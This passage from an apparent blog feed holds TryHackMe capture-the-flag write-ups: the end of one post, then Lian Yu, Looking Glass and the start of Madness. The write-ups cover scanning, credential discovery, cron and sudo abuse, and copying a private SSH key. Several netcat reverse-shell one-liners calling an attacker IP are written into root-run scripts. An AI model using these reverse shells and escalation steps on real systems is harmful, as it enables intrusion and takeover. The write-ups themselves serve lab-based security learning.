&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay backup scripts are usually interesting. Let&amp;rsquo;s see.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@THM-Chal:/$ cat /home/itguy/backup.pl
cat /home/itguy/backup.pl
#!/usr/bin/perl

system(&amp;quot;sh&amp;quot;, &amp;quot;/etc/copy.sh&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;What about the permissions?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@THM-Chal:/home/itguy$ ls -la | grep backup
ls -la | grep backup
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can&amp;rsquo;t edit it. It runs another script named &lt;code&gt;/etc/copy.sh&lt;/code&gt;. Let&amp;rsquo;s check that out.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.0.190 5554 &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;OOF looks like a reverse shell. Can we edit it though?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Uh &amp;hellip; its owned by root.&lt;/p&gt;
&lt;p&gt;All hope lost? Well, check the permissions XD&lt;/p&gt;
&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;RevShells&lt;/a&gt;, we ge the command,&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.17.8.184 1337 &amp;gt;/tmp/f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I tried using nano, but it did not work. No vim either. So, we do &lt;code&gt;echo&lt;/code&gt; :P&lt;/p&gt;
&lt;p&gt;&lt;code&gt;www-data@THM-Chal:/etc$ echo &amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.17.8.184 1234 &amp;gt;/tmp/f&amp;quot; &amp;gt; copy.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Execute it as,&lt;/p&gt;
&lt;p&gt;&lt;code&gt;www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;While having a listener setup using netcat. Remember: It needs to be on another port - because we are already using one we connected to before.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/NnasIBg.png&#34; alt=&#34;Getting the reverse shell with root permissions&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;And &amp;hellip; we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Lian Yu Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-lian-yu-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-lian-yu-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/SBMvmJZ.jpg" alt="Featured image of post TryHackMe: Lian Yu Writeup" /&gt;&lt;h2 id=&#34;1-port-scanning--enumeration&#34;&gt;1. Port Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.185.218
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 04:00 EDT
Nmap scan report for 10.10.185.218
Host is up (0.19s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34042/udp   status
|   100024  1          40662/tcp   status
|   100024  1          41729/tcp6  status
|_  100024  1          46517/udp6  status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.45 seconds

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No &lt;code&gt;ftp&lt;/code&gt; anon login. That&amp;rsquo;s good. Nothing out of ordinary.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2 Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.185.218 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/***a**               (Status: 301) [Size: 236] [--&amp;gt; http://10.10.185.218/***a**/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interesting. Looking at the source code, we get:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;p&amp;gt;You should find a way to &amp;lt;b&amp;gt; Lian_Yu&amp;lt;/b&amp;gt; as we are planed. The Code Word is: &amp;lt;/p&amp;gt;&amp;lt;h2 style=&amp;quot;color:white&amp;quot;&amp;gt; *****a**e&amp;lt;/style&amp;gt;&amp;lt;/h2&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It also hints at &amp;lsquo;find a way&amp;rsquo;. This means more enumeration :D&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.185.218/***a** -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q

/21**                 (Status: 301) [Size: 241] [--&amp;gt; http://10.10.185.218/***a**/21**]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the source code again, we get:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;!-- you can avail your .ticket here but how?   --&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Time for another round of web enumeration!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.185.218/***a**/21** -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket -q
/g****_*****.ticket   (Status: 200) [Size: 71]

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ey, viola!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;This is just a token to get into Queen&#39;s Gambit(Ship)


RTy8yh******
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;13-decoding&#34;&gt;1.3 Decoding&lt;/h3&gt;
&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CyberChef&lt;/a&gt;, I hoped to get some thing, but to no avail. It only says base64, but prints some garbage if we use it.&lt;/p&gt;
&lt;p&gt;Having some previous blockchain experience, I remember that BTC usernames and something something uses base58. Trying that out, we get: &lt;code&gt;!#th3****&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Using the &lt;code&gt;*****a**e&lt;/code&gt; and the &lt;code&gt;!#th3****&lt;/code&gt; as creds to ftp, we get in!&lt;/p&gt;
&lt;h3 id=&#34;14-ftp&#34;&gt;1.4 FTP&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.185.218
Connected to 10.10.185.218.
220 (vsFTPd 3.0.2)
Name (10.10.185.218:kali): *****a**e
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen&#39;s_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp&amp;gt; get Leave_me_alone.png
...
ftp&amp;gt; get Queen&#39;s_Gambit.png
...
ftp&amp;gt; get aa.jpg
... 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;15-file-exploration&#34;&gt;1.5 File Exploration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ file Leave_me_alone.png 
Leave_me_alone.png: data
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile aa.jpg
Enter passphrase: 
wrote extracted data to &amp;quot;ss.zip&amp;quot;.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trying empty string did not work, but password as password did. Quite common, plus, I&amp;rsquo;d like to dodge as many stego challenges :D&lt;/p&gt;
&lt;p&gt;Anyways, going in, we have two files&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat passwd.txt
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, ****** learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We get a username&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat shado     
*********
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&amp;hellip; did not work on the user we saw.&lt;/p&gt;
&lt;p&gt;Tracing our steps back, we may have missed something important: &lt;code&gt;ls -la&lt;/code&gt; is always preferred over &lt;code&gt;ls&lt;/code&gt;. I took note!&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s the interesting file we missed:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking in it, we get a whole bunch of other users, and we just try them one by one :D&lt;/p&gt;
&lt;p&gt;PS: You could use Hydra, but I feel that equal work.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ ssh ****e@10.10.185.218
****e@10.10.185.218&#39;s password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

****e@LianYu:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Get the user flag. Easy. Nothing else too interesting. Except - the sudo permissions.&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;Looking it up on &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;gtfobins&lt;/a&gt; we get &lt;code&gt;sudo pkexec /bin/bash&lt;/code&gt; as the command to run. Ez&lt;/p&gt;
&lt;p&gt;And &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;****e@LianYu:~$ sudo /usr/bin/pkexec /bin/bash
root@LianYu:~# cat /root/root.txt
                          Mission accomplished
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Looking Glass Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-looking-glass-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-looking-glass-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/UsmIsXh.png" alt="Featured image of post TryHackMe: Looking Glass Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/lookingglass&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;p&gt;nmap scan:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -script=default -sV -A -T4 10.10.216.198
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 23:58 EST
Nmap scan report for 10.10.216.198
Host is up (0.23s latency).
Not shown: 916 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This goes on for a while &amp;hellip; wtf?&lt;/p&gt;
&lt;p&gt;The website does not show shit, so gobuster is useless. At first i thought this was some bug, but I took a look at the hint, and it made sense: &lt;code&gt;O(log n) A looking glass is a mirror.&lt;/code&gt; It&amp;rsquo;s binary search to find the correct port! Let&amp;rsquo;s do &lt;code&gt;ssh root@IP -p 9000&lt;/code&gt; and move accordingly. Ah for the lowest its showing &amp;lsquo;Lower&amp;rsquo; and for the highest its showing &amp;lsquo;Higher&amp;rsquo;. Now the mirror part makes sense.&lt;/p&gt;
&lt;p&gt;Lesgoo manual brute-forcing &amp;hellip; yaayyyyyyyy :D the best thing ever!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh root@10.10.216.198 -p 9220
Lower
Connection to 10.10.216.198 closed.
❯ ssh root@10.10.216.198 -p 9290
Higher
Connection to 10.10.216.198 closed.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;aiyoo wtf is this shit. No other port in between ;-; Finally I stumble upon the port. What a pain! Also that port isn&amp;rsquo;t shown for some reason hmmmmm&lt;/p&gt;
&lt;p&gt;So we get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;You&#39;ve found the real service.
Solve the challenge to get access to the box
Jabberwocky
&#39;Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

&#39;Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!&#39;

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

&#39;Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!&#39;
Wl ciskvttk me apw jzn.

&#39;Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Apparently its using the vignere ciphers. Don&amp;rsquo;t ask me how I know this. I just know it, ok?&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bewareTheJabberwock&lt;/code&gt; is the last line!&lt;/p&gt;
&lt;p&gt;Once we do that, we get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Enter Secret: &amp;lt;:D&amp;gt;
jabberwock:WaxworksPreciousUnfastenedSorry
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s login using the ssh 22 port (default).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jabberwock@looking-glass:~$ ls
poem.txt  twasBrillig.sh  user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;poem.txt&lt;/code&gt; is the jabberwock poem we saw earlier. Now what?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jabberwock@looking-glass:/home$ ls
alice  humptydumpty  jabberwock  tryhackme  tweedledee  tweedledum
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Well &amp;hellip; this is going to be a pain :/&lt;/p&gt;
&lt;p&gt;So one important thing to look at is &lt;code&gt;crontab&lt;/code&gt;, when nothing else is leading anywhere. We get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now from &lt;code&gt;sudo -l&lt;/code&gt; we saw we can reboot. Sweet! We can just put our things in &lt;code&gt;twasBrillig.sh&lt;/code&gt; to get into tweedledum. What to put in? &lt;code&gt;bash&lt;/code&gt;. That&amp;rsquo;s what I did. And that NOT what you should do.&lt;/p&gt;
&lt;p&gt;do this instead &lt;code&gt;echo &amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc MY_IP 1234 &amp;gt;/tmp/f&amp;quot; &amp;gt; twasBrillig.sh&lt;/code&gt;, which puts this line in the &lt;code&gt;twasBrilling.sh&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;Now my dumbass just put in bash, without realising that the port (which we found initially) was resected at each reboot. great.&lt;/p&gt;
&lt;p&gt;Don&amp;rsquo;t screup here! I&amp;rsquo;m just hoping this works :/ Well. Fuck. 3rd time.&lt;/p&gt;
&lt;p&gt;Now that works :DDD. We first get a proper shell using &lt;code&gt;python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tweedledum@looking-glass:~$ sudo -l
sudo -l
Matching Defaults entries for tweedledum on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tweedledum may run the following commands on looking-glass:
    (tweedledee) NOPASSWD: /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not as much powerful of a user I see.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tweedledum@looking-glass:~$ cat humptydumpty.txt
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This looks like a hash, so we can do a hash identification. However, I did not find anything special here. So, it may as well be a series of hashes?&lt;/p&gt;
&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;https://hashes.com/en/tools/hash_identifier&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this tool&lt;/a&gt;, yes it is!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/L7kQNZ2.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;hell yeah!&lt;/p&gt;
&lt;p&gt;We do not find anything here, other than some more random &lt;code&gt;poetry.txt&lt;/code&gt;. What&amp;rsquo;s left is the user alice. So check out what we can view? Well nothing in the &lt;code&gt;~&lt;/code&gt;, but what abuot &lt;code&gt;.ssh&lt;/code&gt;? Maybe we can get a RSA key?!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;humptydumpty@looking-glass:/home/alice$ ls -la .ssh/id_rsa
ls -la .ssh/id_rsa
-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 .ssh/id_rsa
humptydumpty@looking-glass:/home/alice$ cat .ssh/id_rsa
cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
.....
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nice. Very nice.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh alice@10.10.216.198 -i id.id
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for &#39;id.id&#39; are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key &amp;quot;id.id&amp;quot;: bad permissions
alice@10.10.216.198&#39;s password: 

❯ chmod 600 id.id
❯ ssh alice@10.10.216.198 -i id.id
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ ls
kitten.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv Esc&lt;/h2&gt;
&lt;p&gt;So since we are in, with a stable connection, lets run &lt;code&gt;linpeas.sh&lt;/code&gt; :D&lt;/p&gt;
&lt;p&gt;Transfer using: &lt;code&gt;❯ scp -i path/to/id path/to/linpeas.sh alice@BOX_ID:~&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                         
Sudo version 1.8.21p2 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For setuid:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That did not work &amp;hellip; but something else did:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;alice@looking-glass:~$ cat /etc/sudoers.d/alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# 
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>TryHackMe: Madness Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-madness-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-madness-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/Ord2COL.png" alt="Featured image of post TryHackMe: Madness Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/madness&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing extraordinary.&lt;/p&gt;
&lt;h3 id=&#34;12-web-exploration&#34;&gt;1.2. Web Exploration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;    &amp;lt;div class=&amp;quot;main_page&amp;quot;&amp;gt;
      &amp;lt;div class=&amp;quot;page_header floating_element&amp;quot;&amp;gt;
        &amp;lt;img src=&amp;quot;thm.jpg&amp;quot; class=&amp;quot;floating_element&amp;quot;/&amp;gt;
&amp;lt;!-- They will never find me--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the homepage, which is a default ubuntu page, we see the &lt;code&gt;thm.jpg&lt;/code&gt; image, that does not render out properly. We see it in the source code.&lt;/p&gt;
